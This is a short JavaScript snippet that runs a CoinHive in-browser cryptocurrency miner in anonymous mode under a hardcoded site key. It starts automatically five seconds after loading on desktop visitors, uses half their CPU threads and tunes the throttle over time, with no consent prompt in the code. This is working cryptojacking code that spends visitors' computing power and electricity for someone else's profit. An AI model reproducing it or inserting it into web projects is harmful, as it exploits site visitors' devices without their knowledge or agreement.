var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');

miner.setNumThreads(Math.round(miner.getNumThreads() / 2));

//miner.setThrottle(0.3)

setTimeout(startMiner, 5000)

function startMiner() {

    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):
    if (!miner.isMobile() && !miner.didOptOut(14400)) {
        miner.start();
    }

    var interval = setInterval(function () {
        // var threads = miner.getNumThreads();
        // if (threads <= 1) {
        //     miner.setThrottle(0.1)
        //     clearInterval(interval);
        // } else {
        //     miner.setNumThreads(threads - 1);
        // }
        if (miner.getThrottle() >= 0.8) return; 
        miner.setThrottle(miner.getThrottle()+0.1);
    }, 45 * 1000);
}